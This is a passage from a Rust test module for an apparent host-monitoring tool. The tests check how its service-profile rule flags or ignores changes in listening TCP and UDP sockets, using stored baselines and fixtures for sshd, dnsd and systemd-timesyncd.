        let findings = evaluate_service_profile(&second, &config, Some(&store))?;

        assert_eq!(findings.len(), 1);
        assert_eq!(findings[0].rule_id, "SERVICE-001");
        assert!(findings[0]
            .evidence
            .iter()
            .any(|item| item.key == "dynamic_udp_listener" && item.value == "true"));
        Ok(())
    }

    #[test]
    fn privileged_udp_port_change_still_requires_review() -> Result<(), Box<dyn std::error::Error>>
    {
        let temp = tempfile::tempdir()?;
        let store = SqliteStore::open(temp.path().join("sentinel.db"))?;
        let config = SentinelConfig::default();
        let first = vec![udp_socket("0.0.0.0", 53, "dnsd", "/usr/bin/dnsd")];
        let second = vec![udp_socket("0.0.0.0", 54, "dnsd", "/usr/bin/dnsd")];

        assert!(evaluate_service_profile(&first, &config, Some(&store))?.is_empty());
        let findings = evaluate_service_profile(&second, &config, Some(&store))?;

        assert_eq!(findings.len(), 1);
        assert_eq!(findings[0].severity, sentinel_core::Severity::Medium);
        assert!(!findings[0]
            .evidence
            .iter()
            .any(|item| item.key == "dynamic_udp_listener"));
        Ok(())
    }

    #[test]
    fn ignores_configured_dynamic_udp_client_processes() -> Result<(), Box<dyn std::error::Error>> {
        let temp = tempfile::tempdir()?;
        let store = SqliteStore::open(temp.path().join("sentinel.db"))?;
        let config = SentinelConfig::default();
        let first = vec![socket("0.0.0.0", 22, "sshd", "/usr/sbin/sshd")];
        let second = vec![
            socket("0.0.0.0", 22, "sshd", "/usr/sbin/sshd"),
            socket_with_protocol(
                "udp6",
                "::",
                48446,
                "systemd-timesyncd",
                "/usr/lib/systemd/systemd-timesyncd",
            ),
        ];

        assert!(evaluate_service_profile(&first, &config, Some(&store))?.is_empty());
        let findings = evaluate_service_profile(&second, &config, Some(&store))?;

        assert!(findings.is_empty());
        Ok(())
    }

    #[test]
    fn ignores_loopback_ssh_forwarding_listeners() -> Result<(), Box<dyn std::error::Error>> {
        let temp = tempfile::tempdir()?;
        let store = SqliteStore::open(temp.path().join("sentinel.db"))?;
        let config = SentinelConfig::default();
        let first = vec![socket("0.0.0.0", 22, "sshd", "/usr/sbin/sshd")];
        let second = vec![
            socket("0.0.0.0", 22, "sshd", "/usr/sbin/sshd"),
            socket("127.0.0.1", 6010, "sshd", "/usr/sbin/sshd")
                .with_field("cmdline", "sshd: root@pts/0"),
            socket("::1", 6010, "sshd", "/usr/sbin/sshd").with_field("cmdline", "sshd: root@pts/0"),
        ];

        assert!(evaluate_service_profile(&first, &config, Some(&store))?.is_empty());
        let findings = evaluate_service_profile(&second, &config, Some(&store))?;

        assert!(findings.is_empty());
        Ok(())
    }

    #[test]
    fn refresh_uses_configured_dynamic_udp_policy() -> Result<(), Box<dyn std::error::Error>> {
        let temp = tempfile::tempdir()?;
        let store = SqliteStore::open(temp.path().join("sentinel.db"))?;
        let mut config = SentinelConfig::default();
        config.service_profile.dynamic_udp_enabled = false;

        let first = vec![udp_socket("0.0.0.0", 42549, "relay", "/usr/bin/relay")];
        let second = vec![udp_socket("0.0.0.0", 59737, "relay", "/usr/bin/relay")];

        let count = super::refresh_service_profile(&first, &config, &store)?;
        let findings = evaluate_service_profile(&second, &config, Some(&store))?;

        assert_eq!(count, 1);
        assert_eq!(findings.len(), 1);
        assert_eq!(findings[0].rule_id, "SERVICE-001");
        Ok(())
    }

    fn socket(addr: &str, port: u16, name: &str, exe: &str) -> RawEvent {
        RawEvent::new("network", "listening_socket")
            .with_field("protocol", "tcp")
            .with_field("local_addr", addr)
            .with_field("local_port", port.to_string())
            .with_field("process_name", name)
            .with_field("executable", exe)
            .with_field("cmdline", exe)
    }

    fn udp_socket(addr: &str, port: u16, name: &str, exe: &str) -> RawEvent {
        socket_with_protocol("udp", addr, port, name, exe)
    }

    fn socket_with_protocol(
        protocol: &str,
        addr: &str,
        port: u16,
        name: &str,
        exe: &str,
    ) -> RawEvent {
        RawEvent::new("network", "listening_socket")
            .with_field("protocol", protocol)
            .with_field("local_addr", addr)
            .with_field("local_port", port.to_string())
            .with_field("process_name", name)
            .with_field("executable", exe)
            .with_field("cmdline", exe)
    }
}
